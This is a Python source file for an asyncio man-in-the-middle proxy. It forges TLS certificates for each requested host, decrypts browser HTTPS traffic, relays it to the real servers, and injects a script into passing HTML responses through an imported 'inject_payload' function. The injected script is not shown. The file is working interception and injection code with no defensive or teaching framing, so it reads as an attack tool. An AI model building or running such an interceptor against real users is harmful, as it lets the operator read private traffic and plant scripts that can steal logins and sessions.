import asyncio
import ssl
from .cert_manager import CertManager
from payloads.inject_js import inject_payload

class Interceptor:
    def __init__(self, cert_manager):
        self.cert_manager = cert_manager

    async def handle_client(self, reader, writer):
        """
        The entry point for every browser connection.
        Determines if the traffic is HTTP or HTTPS.
        """
        try:
            # Peek at the first line of the request
            data = await reader.read(4096)
            if not data:
                writer.close()
                return

            # Check if it's a direct TLS handshake (Client Hello)
            if data.startswith(b'\x16\x03'):
                print("\n[!] Received direct TLS handshake without a CONNECT request.")
                print("[!] This usually means you typed 'https://127.0.0.1:8080' in your browser ")
                print("[!] OR your browser is configured to use a SOCKS proxy instead of an HTTP/HTTPS proxy.")
                print("[!] Please configure your browser to use an HTTP proxy at 127.0.0.1:8080 and visit a real domain (e.g., http://example.com).")
                writer.close()
                return

            # Normalize line endings for splitting
            first_line = data.splitlines()[0] if data.splitlines() else b""
            
            # If the browser sends 'CONNECT google.com:443', it's HTTPS
            if first_line.startswith(b'CONNECT'):
                await self.handle_https(reader, writer, data)
            else:
                # Otherwise, it's standard plain-text HTTP
                await self.handle_http(reader, writer, data)
        except Exception as e:
            print(f"[!] Error handling client: {e}")
            writer.close()

    async def handle_http(self, reader, writer, initial_data):
        """Handles plain HTTP traffic (port 80)."""
        host = self.extract_host(initial_data)
        
        if not host:
            # Silently ignore noise or malformed probes
            writer.close()
            return

        print(f"[*] HTTP Request to: {host}")

        try:
            reader_server, writer_server = await asyncio.open_connection(host, 80)
            writer_server.write(initial_data)
            await writer_server.drain()
            
            # Relay traffic using asyncio streams
            await self.shuttle_traffic_streams(reader, writer, reader_server, writer_server)
        except Exception as e:
            print(f"[!] HTTP Error ({host}): {e}")
            writer.close()

    async def handle_https(self, reader, writer, initial_data):
        """Handles the SSL/TLS Handshake and MITM."""
        hostname = "unknown"
        try:
            parts = initial_data.split()
            if len(parts) < 2:
                writer.close()
                return
            host_port = parts[1].decode()
            hostname = host_port.split(':')[0]

            # 1. Tell browser the tunnel is ready
            writer.write(b'HTTP/1.1 200 Connection Established\r\n\r\n')
            await writer.drain()

            # 2. Prepare the fake cert context
            cert_path, key_path = self.cert_manager.get_cert(hostname)
            ssl_context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_context_client.load_cert_chain(certfile=cert_path, keyfile=key_path)
            
            # 3. Upgrade the client connection to TLS
            try:
                loop = asyncio.get_event_loop()
                transport = writer.transport
                protocol = getattr(writer, '_protocol', None)
                # Call the loop's start_tls directly to avoid StreamWriter signature bugs across Python versions.
                # Pass transport, protocol, and sslcontext explicitly as positional arguments.
                new_transport = await loop.start_tls(
                    transport, 
                    protocol, 
                    ssl_context_client, 
                    server_side=True
                )
                
                # Manually replace the transport on the streams and protocol
                writer._transport = new_transport
                if hasattr(reader, '_transport'):
                    reader._transport = new_transport
                if hasattr(protocol, '_replace_transport'):
                    protocol._replace_transport(new_transport)
            except Exception as e:
                # This is where 'CERTIFICATE_UNKNOWN' usually surfaces
                print(f"[!] SSL Handshake failed for {hostname}: {e}")
                writer.close()
                return

            # 4. Connect to the real destination server
            ssl_context_server = ssl.create_default_context()
            try:
                reader_server, writer_server = await asyncio.open_connection(
                    hostname, 443, ssl=ssl_context_server
                )
            except Exception as e:
                print(f"[!] Could not connect to {hostname}:443: {e}")
                writer.close()
                return

            # 5. Relay using the existing reader and writer (now wrapped in TLS)
            await self.shuttle_traffic_streams(reader, writer, reader_server, writer_server)

            
        except Exception as e:
            print(f"[!] HTTPS Error ({hostname}): {e}")
            writer.close()

    async def shuttle_traffic_streams(self, reader_client, writer_client, reader_server, writer_server):
        """Relays data between client and server using asyncio streams."""
        async def pipe(reader, writer, is_response):
            try:
                while True:
                    data = await reader.read(8192)
                    if not data:
                        break
                    
                    if is_response:
                        # Check for HTML to inject our script
                        if b'text/html' in data or b'<body' in data.lower():
                            data = inject_payload(data)
                            
                    writer.write(data)
                    await writer.drain()
            except Exception:
                pass
            finally:
                try:
                    writer.close()
                except:
                    pass

        # Run both directions in parallel
        await asyncio.gather(
            pipe(reader_client, writer_server, False),
            pipe(reader_server, writer_client, True)
        )

    def extract_host(self, data):
        """Helper to find the Host: header in HTTP requests."""
        lines = data.splitlines()
        for line in lines:
            if line.lower().startswith(b'host: '):
                try:
                    host_val = line.split(b':', 1)[1].strip().decode()
                    if ':' in host_val:
                        return host_val.split(':')[0]
                    return host_val
                except Exception:
                    continue
        
        # Fallback to request line
        if len(lines) > 0:
            parts = lines[0].split()
            if len(parts) > 1 and b'://' in parts[1]:
                from urllib.parse import urlparse
                try:
                    url = parts[1].decode()
                    return urlparse(url).hostname
                except Exception:
                    pass
        return None
